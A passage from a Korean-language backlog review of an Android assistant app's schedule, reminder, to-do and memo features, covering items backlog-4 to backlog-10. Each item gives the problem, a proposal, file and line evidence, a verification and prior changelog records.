- 검증: 직접 확인: ToolNames.kt:10-19 는 8개(수정·삭제 없음), CalendarTool.kt:10-13 은 readEvents·insert 둘, AddScheduleUseCase.kt:57-70 은 insert 가 돌려준 Long 을 'is AppResult.Success -> Unit' 으로 버린다. CalendarScreen.kt:179 는 알림 항목에만 onClick 을 주고 일정은 null, UpcomingRow(299-312)·MonthCalendar.kt:319-325 ScheduleRow 에 누름 동작 없음. 삭제 호출은 MemoryViewModel.kt:199-201(할 일 탭 — getPendingTodosData 라 일정 행은 안 보임, :81)과 완료 일괄 삭제(dueDateIso IS NULL 만, TaskDao.kt:36)·데이터 초기화뿐. 겹침 제거는 (제목, 시작 ms) 일치만(GetTodayScheduleUseCase.kt:136-139)이라 기기 캘린더에서 시각을 옮기면 두 번 보인다는 설명도 맞다. backlog-1 과 뿌리가 같다(일정 행이 영원히 '완료 안 됨'). 화면 쪽 제안은 모델 입력과 무관. 기기 캘린더 이벤트 id 저장은 Room 마이그레이션이 필요해 S 가 아니라 M 이 맞다.
- 앞선 기록: docs/expand.md:63·148·151 'B2 일정 수정/삭제 — 현재 일정은 생성만 가능, 삭제 정책 재검토 선행'(미착수로 알고 있는 빈틈, 채팅 툴 관점). 화면에서 지울 길이 없다는 점은 CHANGELOG·architecture·plans 에 기록 없음.

### backlog-4 · 채팅의 일정 조회는 오늘부터 7일만 본다 — 그 밖의 날짜를 물으면 '일정이 없어요'가 된다
- 판정 확인됨 · 중요도 중간 · 크기 M · 모델 입력
- 왜: 일정 추가는 날짜 제한이 없어 '다다음 주 금요일 치과'도 넣을 수 있는데, 조회는 7일 창만 본다. 2주 뒤 치과를 잡아 두고 며칠 뒤 '치과 예약 언제였지?'라고 물으면 툴 결과에 그 일정이 없고, 결과 끝의 안내가 '없으면 없다고만 답하라'고 하므로 모델은 '치과 일정은 없어요'라고 답하게 된다 — 저장돼 있는데 없다고 하는 틀린 답이다(이 저장소가 여러 번 고쳐 온 '틀린 답을 성공처럼' 유형). '어제 회의 몇 시였지'처럼 지난 일정도 같다. 0.42.1 에서 '약속 언제였지'를 일정 조회로 보내도록 바꾼 뒤라 더 자주 탈 길이다. 범위 제한은 코드로 확인했고, 모델의 최종 답 문장은 재지 않았다.
- 제안: 선언(고정 토큰)은 그대로 두고 실행기만 바꾼다. '오늘'이 아닌 조회는 오늘부터 30~60일(월 조회용 loadRange 재사용)을 읽되, 결과가 길어지지 않게 7일 안은 지금처럼 전부, 그 뒤는 가까운 순 몇 건만 싣고 토큰 상한(SentenceTruncator)은 유지한다. 최소 처방은 결과 끝에 '오늘부터 7일만 조회했습니다 — 그 밖의 날짜는 확인하지 못했다고 답하세요' 한 줄을 붙이는 것. 어느 쪽이든 툴 결과 문구가 바뀌므로 회귀 세트의 일정 묶음과 날짜 대조 실험(exp73 계열)을 먼저 다시 잰다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/GetScheduleToolExecutor.kt:48-52 — 인자가 '오늘'이 아니면 전부 '이번 주' 범위로
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/GetTodayScheduleUseCase.kt:52-61 — '이번 주' = 오늘 0시부터 오늘+6일 끝까지(지난 날·8일째 이후는 조회 안 됨)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/GetScheduleToolExecutor.kt:58-59, 102-103 — 범위에 없으면 '등록된 일정이 없어요.', 있으면 끝에 '그 날짜에 일정이 없으면 없다고만 답하라'는 안내가 붙는다(조회 범위가 7일뿐이라는 말은 없음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/context/PromptAssembler.kt:279 — '약속 언제였지'·'치과 몇 시였지'를 일정 조회로 보내는 트리거(0.42.1)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/runtime/gemma/KosmosToolDeclarations.kt:113-119 — 선언상 인자는 'today' 또는 'week' 둘뿐
- 검증: 직접 확인: GetScheduleToolExecutor.kt:47-52 는 비었거나 today/오늘이면 TODAY, 나머지는 전부 WEEK. GetTodayScheduleUseCase.kt:52-61 은 오늘 0시~오늘+6일 끝. 범위에 없으면 '등록된 일정이 없어요.'(:58-59), 있으면 꼬리 안내 '그 날짜에 일정이 없으면 없다고만 답하고…'(:102-103) — 조회 범위가 7일뿐이라는 말은 어디에도 없다. PromptAssembler.kt:279 트리거와 KosmosToolDeclarations.kt:113-119('today' 또는 'week') 확인. 일정 추가에는 날짜 제한이 없으므로 '8일 뒤 이후·지난 일정을 물으면 저장돼 있어도 없다고 답할 수 있다'는 경로가 코드로 성립한다. 모델의 최종 문장은 재지 않은 추정이라 심각도는 중간 유지. 툴 결과 문구·범위를 바꾸므로 회귀 세트 일정 묶음 실측이 선행돼야 한다(모델 입력 변경 맞음). 세부: 꼬리 안내는 일정이 하나라도 있을 때만 붙는다(:71) — 7일 안에 다른 일정이 있으면 '그 날짜엔 없다', 하나도 없으면 '등록된 일정이 없어요'로 두 갈래 모두 틀린 답.
- 앞선 기록: CHANGELOG 0.28.0(docs/CHANGELOG.md:924 — 툴·브리핑·위젯이 공유하는 범위에 월을 넣지 않음, 프롬프트 표면 무변경). CHANGELOG 0.42.1(일정 조회 트리거에 '약속 언제였지'·'치과 몇 시였지'). 7일 밖을 물으면 없다고 답하는 문제는 기록 없음.

### backlog-5 · 울린 알림을 처리할 길이 불편하다 — 알림에 버튼이 없고, 누르면 채팅만 열리며, 울린 알림이 '할 일 N'에 계속 남는다
- 판정 일부만 맞음 · 중요도 중간 · 크기 M
- 왜: '30분 뒤 물 마시라고 알려줘' 같은 알림을 하루 몇 번 쓰면, 울릴 때마다 할 수 있는 일이 '알림을 눌러 앱을 열고(모델 깨우기 약 10초) 메뉴에서 할 일 탭을 찾아 체크'뿐이다. 체크하지 않으면 울린 알림이 할 일로 계속 남아 위젯·채팅 요약의 '할 일 N'이 부풀고(backlog-1 의 원인이기도 함), 일정 화면 '오늘' 탭에는 안 보여 숫자와 화면이 어긋난다. 알림을 가장 자주 쓰게 될 실사용에서 매번 걸리는 마찰이다. '울려도 할 일은 안 끝난 것'이라는 설계 의도는 유지하되 끝낼 길이 가까워야 한다.
- 제안: 알림에 [완료] [10분 뒤] 버튼 두 개를 단다 — 내보내지 않는(exported=false) 수신기 하나가 완료 처리(+위젯 갱신) 또는 다시 예약을 한다(모델·채팅 기록 없이, ReminderEditor 의 시각 계산만 재사용). 알림 본문을 누르면 채팅이 아니라 일정 화면 '오늘' 탭으로 가게 인텐트에 목적지를 싣는다(AppNavHost 의 기존 이동 경로 사용). '물 마시기' 같은 한 번짜리 알림은 울리면 자동 완료로 볼지 사용자에게 묻는다. 휴대폰 확인 항목(알림 버튼, 잠금 화면)을 device_gate 에 남긴다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/notification/ReminderNotifier.kt:40-47, 66-75 — 알림에 동작 버튼(addAction) 없음, 누르면 아무 정보 없이 MainActivity 만 연다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/MainActivity.kt:99-102 — 들어온 인텐트는 공유·음성 실행만 처리(알림에서 왔다는 것을 모름)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/alarm/ReminderFireHandler.kt:51-52 — 울린 뒤에는 '울림 시각'만 적고 완료 처리는 하지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/data/src/main/java/com/kosmos/app/data/local/db/dao/TaskDao.kt:25-26, 48-49 — 할 일 탭 목록·개수(위젯·채팅 요약의 '할 일 N')는 울린 알림도 센다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/calendar/TodaySchedule.kt:70-76 — '오늘' 탭은 아직 안 울린 오늘 알림과 날짜·알림 없는 할 일만 보여, 울린 알림은 여기서 사라진다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/result/ReminderEditor.kt:58-63 — '10분 미루기' 로직은 이미 있지만 채팅 카드·일정 화면 시트에서만 부른다
- 검증: 직접 확인: ReminderNotifier.kt:40-47 에 addAction 없음, contentIntent(:66-75)는 부가 정보 없이 MainActivity. MainActivity.kt:99-102 dispatchIntent 는 공유·음성만 처리. ReminderFireHandler.kt:51-52 는 알림 게시 뒤 markReminded 만. TaskDao.kt:25-26·48-49 는 dueDateIso 만 걸러 울린 알림을 할 일 목록·개수에 포함. TodaySchedule.kt:70-76 은 getActiveReminders(미발화)와 remindAtIso 없는 것만 보여 울린 알림은 '오늘' 탭에서 빠진다. ReminderEditor.kt:58-63 snooze 존재. 사실 관계는 모두 맞다. 다만 '결함'이 아니라 편의 빈틈이고, 울린 알림이 할 일로 남는 것 자체는 0.21.0 의 의도된 설계다(끝낼 길도 할 일 탭 체크로 있음) — 그래서 일부만 인정. 남는 가치는 알림 버튼([완료]·[10분 뒤])과 누른 뒤 목적지. '울리면 자동 완료' 는 기존 결정을 뒤집는 것이므로 사용자에게 물어야 한다. 알림 UI 는 JVM 게이트로 못 잡으니 휴대폰 확인 항목 필요.
- 앞선 기록: CHANGELOG 0.21.0 — '울림과 완료는 별개'는 의도한 설계. CHANGELOG 0.38.2(알림 카드 수정 시트 — 미루기·시간 바꾸기·취소). 알림 자체의 버튼·누른 뒤 목적지는 기록 없음.

### backlog-6 · 채팅으로 할 일을 추가·조회할 수 없다 (이미 아는 후보 — 아직 열려 있음)
- 판정 이미 결정·기록됨 · 중요도 중간 · 크기 M · 모델 입력
- 왜: '장보기 할 일에 추가해줘'는 비서 앱에서 가장 먼저 해 보는 말인데, 지금은 모델이 '메모해 둘까요?'로 엉뚱하게 되묻는다(0.42.10 휴대폰 기록). 할 일은 화면에서 손으로만 넣을 수 있고 채팅은 그 목록을 읽지도 못해 '오늘 할 일 뭐 남았어?'에도 답하지 못한다. 실사용 첫 주에 걸릴 가능성이 높다. 막고 있는 것은 고정 토큰 여유(약 20)와, 한 줄만 넣어도 다른 문항이 흔들린 0.42.9 경험이다.
- 제안: 두 갈래를 계획 단계에서 사용자에게 묻는다. (가) 모델 입력을 늘리지 않는 앱 판정: 지금의 '메모 저장 요청 판정'과 같은 방식으로 '할 일(에) … 추가' 문형을 앱이 알아보고 승인 시트 → 저장(모델을 거치지 않음). 조회는 알림 목록 툴 결과 끝에 '[할 일]' 몇 줄을 덧붙이는 안(결과 문구만 바뀜). 대가는 규칙 기반이라 말투 변형에 약한 것. (나) 툴 하나 추가(할 일 추가·조회를 한 툴로) — 선언·트리거 토큰을 먼저 재고, 다른 줄을 줄여 자리를 만든 뒤 회귀 세트 전체를 돌린다. 어느 쪽이든 사용 안내에 '할 일은 지금 화면에서만'을 먼저 한 줄 적어 둔다(backlog-10).
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/tool/ToolNames.kt:10-19 — 할 일 툴 없음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/runtime/gemma/KosmosToolDeclarations.kt:41-50 — 선언된 8개 툴에도 없음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/ListRemindersToolExecutor.kt:40 — 알림 목록 툴은 아직 안 울린 알림만 읽는다(날짜 없는 할 일은 못 봄)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/memory/MemoryViewModel.kt:102-126 — 할 일 추가는 할 일 탭의 입력 칸에서만
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/res/values/strings.xml:296 — 빈 화면 안내는 0.42.10 에서 '아래 칸에 적어 추가하세요'로 고쳐짐(이 부분은 닫힘)
- 검증: 사실 관계는 맞다: ToolNames.kt:10-19 에 할 일 툴 없음, ListRemindersToolExecutor.kt:40 은 getActiveReminders(미발화 알림)만, 빈 화면 문구는 strings.xml:296 '아래 칸에 적어 추가하세요'로 이미 고쳐짐. 그러나 이 빈틈은 0.42.10 에서 이미 알고 '실사용 중 필요하면 한 회차로' 미루기로 사용자가 결정한 것이라 새 발견이 아니다. 새로운 것은 제안 (가) '모델 입력을 늘리지 않는 앱 판정(메모 저장 판정과 같은 방식)'이라는 대안뿐 — 회차를 열 때 선택지로 올릴 수는 있으나, 알림 목록 툴 결과에 '[할 일]'을 덧붙이는 조회 안은 툴 결과 문구 변경이라 실측 대상이다.
- 앞선 기록: CHANGELOG 0.42.10(docs/CHANGELOG.md:4-7) — '다음 후보(사용자 결정 — 실사용 중 필요하면): 채팅 할 일 추가·조회 툴을 한 회차로, 회귀 세트 실측 선행'. CHANGELOG 0.42.9(18토큰 줄 하나가 clock·inject 묶음을 흔듦).

### backlog-7 · 30분 넘게 쉬었다 보내는 첫 말은 미리 준비가 안 돼 있어 약 4~5초를 더 기다린다 (이미 아는 후보 — 아직 열려 있음)
- 판정 이미 결정·기록됨 · 중요도 낮음 · 크기 M · 모델 입력
- 왜: 매일 쓰는 사람의 대부분의 첫 말은 '30분 넘게 쉰 뒤'다(아침 브리핑이 막 들어온 경우만 예외 — 그때는 비서 메시지가 있어 준비된다). 즉 시작 단계에서 모델을 깨우고 준비까지 마쳤다고 화면이 말해도, 가장 흔한 경우의 첫 답은 시스템 지시·툴 선언 약 1,300토큰을 그 자리에서 읽느라 4~5초 늦다. 실측 기록상 준비된 턴은 첫 글자 0.68초, 아닌 턴은 6.15초(0.42.1 휴대폰)로 체감 차이가 크다. 사용 안내에 '새로 읽는 턴은 느립니다'라고 적혀 있지만 가장 자주 만나는 경우라 실사용 인상에 직접 영향을 준다.
- 제안: CHANGELOG 0.41.7 이 남긴 대로 '기록이 빌 때 앞부분만 읽히는 방법'을 실험실에서 먼저 잰다: (가) 빈 기록일 때 시스템 지시만 실린 대화에 아주 짧은 모델 메시지(예: 요약 줄을 그대로)를 출력 상한 1 로 보내 읽히기, (나) 런타임의 토큰 수 조회만으로 앞부분이 읽히는지 확인. 남는 한 토큰·덧붙는 메시지가 답을 바꾸지 않는지 회귀 세트로 확인한 뒤 미리 준비 경로에 넣는다. 안 되면 '쉬었다 오면 첫 답이 느리다'를 한계로 굳히고 device_gate 줄을 닫는다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:444-460 — 미리 준비는 '마지막 비서 답'을 모델 메시지로 보내며 앞부분을 읽히는데, 기록이 비면(last == null) 아무것도 읽히지 않고 돌아간다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/agent/IdleGapHistory.kt:30-32 — 마지막 메시지 뒤로 긴 간격이 지났으면 지난 대화 전부를 요약 한 줄로 돌리고 지금 대화 기록은 빈다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/checklists/device_gate.md:338 — '30분 넘게 쉰 뒤 첫 답 — 프리필 1,294토큰(약 4.6초)을 그 턴이 치름 → 다음 후보'가 체크 안 된 채 남아 있음
- 검증: 코드 사실은 맞다: GemmaModelRunner.kt:444-460 에서 last == null 이면 아무것도 보내지 않고 돌아가고, IdleGapHistory.kt:30-32 가 간격 뒤 기록을 비운다. 하지만 주장의 priorRecord 가 0.41.7 '다음 후보'만 보고 그 뒤 회차를 놓쳤다. 제안 (가)(빈 기록일 때 짧은 model 메시지를 출력 1토큰으로 보내기)는 0.41.9 exp84b 에서 이미 재고 기각한 방법 그대로이고, 런타임 옵션 방식도 휴대폰 실측 뒤 사용자 결정으로 접었다. 다시 낼 후보가 아니다. 실제로 남은 일은 문서 한 줄뿐: device_gate.md:338 의 미체크 줄('→ 다음 후보')을 '0.41.9 에서 한계로 둠'으로 닫기(backlog-10 에 합칠 것). 또 '기록이 비는 경우'는 간격 + 요약이 있을 때 하나뿐이라는 기록(0.41.9 계획서 :13)도 있어 '대부분의 첫 말'이라는 빈도 주장은 확인되지 않았다.
- 앞선 기록: CHANGELOG 0.41.9(docs/CHANGELOG.md:353-355) — exp84·84b 로 '기록이 빌 때 짧은 model 메시지로 미리 읽기'를 재서 기각(지금과 일치 1/24, 자기 이름을 Kosmos 로 15/24), 대화 설정의 앞부분 미리 읽기 옵션은 휴대폰 실측 뒤 '쓰지 않는다'. architecture.md:2115-2117 ADR 보충(0.41.9, 사용자 결정 — 첫 토큰 6.0초→1.0~1.5초지만 5번 중 1번 영어 속생각 노출, 원인 미상이라 위험을 감수하지 않음). 계획서 docs/plans/0.41.9-library-followups.md 상태 '완료, M2 는 실측 뒤 쓰지 않음'.

### backlog-8 · 반복 알림이 없다 — '매일 아침 8시에 알려줘'는 한 번짜리 알림으로만 들어간다
- 판정 일부만 맞음 · 중요도 중간 · 크기 M
- 왜: 약 먹기·운동처럼 매일 쓰는 사람이 비서에게 가장 먼저 맡기는 것이 반복 알림이다. 지금은 '매일'이라고 말해도 모델이 내일(또는 오늘) 한 번짜리 알림을 만들고 '설정했어요'라고 답할 가능성이 높다 — 승인 시트에 날짜가 하나만 보이지만 반복이 안 된다는 말은 어디에도 없어, 둘째 날 안 울린 뒤에야 알게 된다. '반복' 관련 낱말을 다루는 코드는 저장소에 없다(전체 검색). 모델이 '매일' 요청에 실제로 어떻게 답하는지는 재지 않았다.
- 제안: 모델 입력을 늘리지 않는 순서로: (1) 알림 수정 시트에 '매일 / 평일 / 매주' 반복 선택을 넣고, 할 일 행에 반복 규칙 열을 추가(Room 마이그레이션), 울림 처리에서 다음 회차를 계산해 다시 예약한다(시각 계산은 순수 함수 + now 인자, 재부팅 복원도 같은 함수). (2) 채팅 쪽은 사용자 말에 '매일·매주·마다'가 있을 때 승인 시트에 '한 번만 울려요 — 반복은 알림을 눌러 설정' 한 줄을 앱이 덧붙인다(모델 입력 불변). 채팅에서 바로 반복으로 넣기(인자 추가)는 토큰 실측이 필요해 뒤로.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/model/TaskItem.kt:3-15 — 알림 시각 하나(remindAtIso)뿐, 반복 규칙 필드 없음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/runtime/gemma/KosmosToolDeclarations.kt:160-166 — add_reminder 인자는 시각 하나와 내용
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/alarm/ReminderFireHandler.kt:51-52 — 울리면 '울림' 표시만 하고 다음 회차를 예약하지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/AddReminderToolExecutor.kt:51-68 — 승인 시트에는 날짜·시각 하나만 보인다('반복 아님' 안내 없음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/result/ReminderEditor.kt:58-87 — 수정 시트 기능은 미루기·시간 바꾸기·취소(반복 없음)
- 검증: 직접 확인: TaskItem.kt:3-15 에 알림 시각 하나(remindAtIso)뿐 반복 필드 없음, KosmosToolDeclarations.kt:160-166 add_reminder 인자는 time·content, ReminderFireHandler.kt:51-52 는 울림 기록만 하고 다음 회차 예약 없음, ReminderEditor.kt:58-87 은 미루기·시간 바꾸기·취소. 기능 부재는 사실. 틀린 부분: "'반복' 관련 낱말을 다루는 코드는 저장소에 없다"는 틀렸다 — domain/.../memory/KnowledgeAutoSaveFilter.kt:45 에 매일·매주·매달·평일·마다·every·daily 정규식이 있다(자동 메모 판정용, :81 주석). 제안 (2)의 '사용자 말에 매일·마다가 있으면 승인 시트에 한 번만 울린다고 덧붙이기'는 이 정규식을 재사용할 수 있다. 또 '모델이 한 번짜리 알림을 만들고 설정했다고 답할 가능성이 높다'는 재지 않은 추정이다. 결함이 아니라 기능 요청이므로, 반복 저장(새 열 + 마이그레이션 + 다음 회차 계산)은 사용자 결정이 필요한 큰 일이고, 당장 값싼 것은 승인 시트 한 줄 안내와 사용 안내의 '알림은 한 번만' 표기다.
- 앞선 기록: CHANGELOG 0.36.0(반복 표현이 든 요청은 습관으로 보고 자동 메모로 남김 — KnowledgeAutoSaveFilter). 반복 알림 기능·'매일' 요청 처리에 대한 결정은 CHANGELOG·architecture·plans·expand.md 에서 찾지 못함.

### backlog-9 · 메모 화면에서는 지우기만 된다 — 검색·고치기·직접 추가가 없다
- 판정 확인됨 · 중요도 낮음 · 크기 M
- 왜: 메모는 '기억해줘'와 자동 추출로 쓸수록 늘어난다. 값이 바뀌면(사물함 번호·비밀번호 변경) 화면에서 고칠 수 없어 채팅으로 새로 저장하고 옛 메모를 목록에서 손으로 찾아 지워야 한다 — 안 지우면 기억 검색이 두 값을 함께 가져와 '다른 값도 있어요' 안내가 붙는다(충돌 안내가 있어 틀린 답까지는 아님). 메모가 수십 건을 넘으면 화면에서 원하는 메모를 찾는 길이 스크롤뿐이다. 지난 대화는 검색·수정이 되는데 메모만 안 되는 불균형은 포트폴리오 시연에서도 눈에 띈다. 급하지는 않다(기억 정리의 '겹치는 메모 합치기'가 일부 덜어 줌).
- 제안: 메모 화면 위에 검색 칸(기억 검색 툴·서랍과 같은 검색 함수 재사용 — 정밀 일치 → 2글자 묶음 점수), 메모 줄을 누르면 고치기 시트(내용·태그, 저장 시 updatedAt 갱신과 뜻 검색 벡터 다시 만들기 표시 — 0.41.16 의 옛 벡터 경합 처리 경로 재사용). 직접 추가는 같은 시트로. 모두 화면 작업이라 모델 입력과 무관하다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/memory/MemoryScreen.kt:388-409 — 메모 줄에 달린 동작은 삭제 버튼 하나(되돌리기 스낵바)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/memory/MemoryViewModel.kt:71-76, 247-266 — 메모는 20건씩 넘겨 보는 목록 + 삭제·되돌리기뿐(검색어 상태 없음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/drawer/DrawerViewModel.kt:92-100 — 서랍 검색은 지난 대화(에피소드)만 찾고 메모는 찾지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/SaveKnowledgeUseCase.kt:26-46 — 저장은 항상 새 메모(같은 주제의 옛 메모를 바꾸지 않음)
- 검증: 직접 확인: MemoryScreen.kt:388-409 메모 줄의 동작은 DeleteIconButton 하나. MemoryViewModel.kt 에 검색어 상태나 메모 수정·추가 함수 없음(searchQuery·fun search·fun update·fun edit grep 0건). DrawerViewModel.kt:92-100 검색은 episodeRepository.search·searchByTags 만 부른다(메모 제외). 사실은 맞고 급하지 않다는 평가도 맞다 — 채팅의 기억 검색 툴로 찾을 수는 있고 값이 겹치면 충돌 안내가 있다. 화면 작업이라 모델 입력과 무관. 고치기 시트는 뜻 검색 벡터 다시 만들기 경로와 묶여 M 크기가 맞다. 실사용에서 메모가 수십 건을 넘은 뒤 판단해도 늦지 않다.
- 앞선 기록: docs/expand.md:64 'B3 메모 저장·검색 강화'(미착수). CHANGELOG 0.38.3(메모 줄 + 휴지통 + 되돌리기). 메모 화면의 검색·수정은 기록 없음.

### backlog-10 · 공개 전 문서 정합성 — 사용 안내에 '못 하는 것'이 없고, README·계획서 안내·확인 목록에 낡은 줄이 남아 있다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 실사용 단계에서는 사용자가 '되는 줄 알고 말했는데 안 되는' 일을 줄이는 것이 사용 안내의 몫인데, 지금 안내는 되는 것만 적혀 있다(0.42.10 이 고친 '없는 기능을 권하는 문구'와 같은 종류의 빈틈). 포트폴리오 단계에서는 README 의 숫자·다음 순서 링크, 계획서 폴더 안내가 현재 규칙과 어긋나 있으면 '문서를 정본으로 관리한다'는 이 프로젝트의 주장이 약해진다. 미확인 4줄은 실사용 중 자연스럽게 볼 수 있는 것들이라 흘려보내기 쉽다.
- 제안: 한 회차(문서만, 버전 끝자리)로: (1) 사용 안내 한/영 '알아 두면 좋은 것'에 '아직 못 하는 것' 묶음 4줄(할 일은 화면에서만, 일정 고치기·지우기 없음, 알림은 한 번만, 일정 조회는 오늘부터 7일)과 위젯 설명 정정, 기준 버전 갱신 — 위 backlog-3·4·6·8 이 고쳐지면 그 줄을 지운다. (2) README 의 ADR 개수는 숫자 대신 '약 40개'·링크로(AGENTS 의 '수치는 베끼지 말 것'), 다음 순서 링크는 현재 6단계 흐름을 적은 곳으로. (3) docs/plans/README.md 를 한 세션 방식으로 고친다. (4) device_gate 미확인 4줄을 real_use_start.md 의 '첫 주에 볼 것'으로 옮기고, 회귀 세트 새 묶음 기준값 저장 여부를 사용자에게 확인한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/guide/USER_GUIDE.md:4, 73, 79 — 기준 버전 0.42.7(앱은 0.42.10), 할 일·일정 설명에 '채팅으로 할 일 추가 안 됨·일정 수정/삭제 안 됨·알림은 한 번만·일정 조회는 7일'이 없음. 위젯은 '할 일을 보고'라고 적혔지만 실제로는 개수만 보인다(widget/KosmosWidget.kt:162-166)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:30, 71, 135 — 'ADR 39개'(architecture.md 에는 ADR-040 까지 40개), '앞으로의 순서는 0.39.x 로드맵'(그 로드맵은 11-01 완료 상태이고 지금 순서는 6단계 흐름)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/plans/README.md:3-4, 13-16 — '계획 세션과 구현 세션(다른 에이전트) 분업'을 설명(AGENTS.md 는 10-27 에 분업 폐기, 한 세션으로)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/checklists/device_gate.md:354, 357, 368, 369 — 0.41.10 조건형 저장 물음, 0.41.11 사실 문장, 0.42.3 회고 거절 표현·바꿔 말한 메모 합치기 후보가 두 번의 휴대폰 확인을 지나도록 미확인
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/plans/0.42.10-real-use-start-check.md:34-37 및 scratch/lab/regression/baseline.json — 회귀 세트 새 묶음(메모 시각 알림)의 기준값이 아직 저장되지 않음(run.py 에는 있음)
- 검증: 직접 확인: USER_GUIDE.md:4 기준 0.42.7(app/build.gradle.kts:24 는 0.42.10 — 0.42.10 이 빈 화면 문구를 바꿨는데 기준 버전이 안 올랐다). 안내 73·79행과 표(42·55행)에 '할 일은 화면에서만·일정 고치기/지우기 없음·알림은 한 번만·일정 조회 7일'이 없다. README.md:30 'ADR 39개'인데 architecture.md 는 ADR-040 까지(### ADR 제목 40개), README.md:71·135 는 끝난 0.39.x 로드맵을 '앞으로의 순서'로 가리킨다. docs/plans/README.md:3-4·13-16 은 계획·구현 세션 분업을 설명 — AGENTS.md §2-① 의 2026-10-27 한 세션 결정과 어긋난다. device_gate.md:354·357·368·369 미체크 확인. baseline.json 에 remind_mem 0건·run.py 2건. 고칠 세부: (1) 위젯 지적은 약하다 — 위젯은 남은 할 일 개수를 보여 주므로(KosmosWidget.kt:162-166) '오늘 일정과 할 일을 보고'가 틀린 말은 아니다. '할 일 수'로 다듬는 정도. (2) 회귀 세트 기준값 미저장은 낡은 것이 아니라 사용자 확인을 기다리는 열린 항목이므로 '확인만 받기'가 맞다. (3) backlog-7 에서 나온 device_gate.md:338 줄(0.41.9 에서 접은 후보가 '다음 후보'로 남음)도 이 회차에 함께 닫으면 좋다. 문서만 고치는 작은 회차로 타당.
- 앞선 기록: 계획서 docs/plans/0.42.10-real-use-start-check.md:34-37 '기억→알림 묶음 기준값은 아직 저장 안 함 — 저장은 사용자 확인 뒤'(일부러 열어 둠). CHANGELOG 0.42.5(device_gate 정리, 0.41.10~11 미확인 표시). README·plans/README 의 낡은 줄, 사용 안내의 한계 목록 부재는 기록 없음.

<details><summary>읽은 범위</summary>

[읽은 것] docs/CHANGELOG.md 는 맨 위 0.42.10~0.42.4(약 140줄)를 전부 읽고, 나머지 1,600줄은 '다음 후보·남은 것·새로 찾음·지켜볼 것·보류' 표지와 주제별 낱말로 검색해 해당 줄만 읽었다(전 줄 통독은 아님). docs/plans 는 0.42.10·0.43.0·unscheduled-hwp·README 를 전부, 0.39.x 로드맵 머리·0.38.3·0.42.6 은 해당 부분만. docs/checklists/device_gate.md 는 체크 안 된 줄 전체와 0.41.10 이후 칸 전부, real_use_start.md 전부. README.md·docs/guide/USER_GUIDE.md(한국어) 전부, docs/expand.md 의 단계 목록, architecture.md 는 ADR-040 만. 코드는 ToolNames·KosmosToolDeclarations·알림 계층 5개 파일(예약·수신·재부팅·울림·알림 표시)·AddReminder/ListReminders/AddSchedule/GetSchedule/SearchWikipedia 실행기·AddReminder/AddSchedule/GetTodaySchedule/GenerateBriefing/SaveKnowledge 유스케이스·TaskDao·TaskEntity·TaskItem·TaskRepository·MemoryViewModel·CalendarViewModel·TodaySchedule·ReminderEditor·DataResetViewModel·WidgetRefresher·ExportImportManager·MainActivity·KosmosApp·매니페스트·IdleGapHistory·ConversationPrewarmer 를 전부 읽었고, CalendarScreen·MonthCalendar·MemoryScreen·KosmosWidget·ChatExtrasViewModel·GemmaModelRunner(미리 준비 함수)·MorningBriefingGenerator(재료 수집)·PromptAssembler(트리거 줄)는 해당 부분만 읽었다.
